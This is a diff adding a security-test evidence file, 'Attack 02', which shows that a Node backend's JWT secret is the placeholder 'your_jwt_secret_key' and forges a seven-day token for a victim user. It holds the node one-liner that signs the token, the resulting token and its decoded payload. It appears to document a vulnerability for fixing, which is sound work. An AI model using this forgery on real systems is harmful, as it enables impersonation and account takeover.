@@ -1,0 +1,46 @@
+﻿# ATTACK 02 — Forge a token for the victim
+
+# Target: any endpoint guarded by authMiddleware.js or auth.js
+# Goal:   prove that with the recovered secret, a valid token can be
+#         minted for any user without knowing their password.
+# Expected (secure): 256-bit random secret -> forgery is impossible.
+# Actual (this run): the secret is the public placeholder
+#         'your_jwt_secret_key', so forgery succeeds in under a second.
+
+## 1. Inputs
+
+Victim _id:      6ab8c34778abdbeba12c853f
+Recovered secret: your_jwt_secret_key  (see before-attack-01-crack-secret.txt)
+
+## 2. Command (executed from backend/)
+
+node -e "const jwt=require('jsonwebtoken');
+const t=jwt.sign({userId:process.argv[1],name:'Victim',email:'victim@gmail.com'},
+'your_jwt_secret_key',{expiresIn:'7d'});console.log(t);" $VICTIM
+
+## 3. Output
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2YWI4YzM0Nzc4YWJkYmViYTEyYzg1M2YiLCJuYW1lIjoiVmljdGltIiwiZW1haWwiOiJ2aWN0aW1AZ21haWwuY29tIiwiaWF0IjoxNzkwNDk2Njc2LCJleHAiOjE3OTExMDE0NzZ9.DrA3C_Q7NOsVqa1IvE67A3mbcqjYi5UPYNJUkdAVKAY
+
+## 4. Decoded payload of the forged token
+
+{
+  "userId": "6ab8c34778abdbeba12c853f",
+  "name":   "Victim",
+  "email":  "victim@gmail.com",
+  "iat":    1790496676,
+  "exp":    1791101476
+}
+
+## 5. Interpretation
+
+No password, OTP, or second factor was involved. The forged token is
+byte-identical in structure to a legitimate token and is signed with
+the real HMAC key. Every middleware that calls jwt.verify() with this
+same secret will accept it. See Attack 03 for proof that it is
+accepted by a protected endpoint.
+
+## 6. Files
+
+- before-attack-02-forged-token.txt  (the forged JWT itself)
+- before-attack-01-crack-secret.txt  (the crack that produced the key)
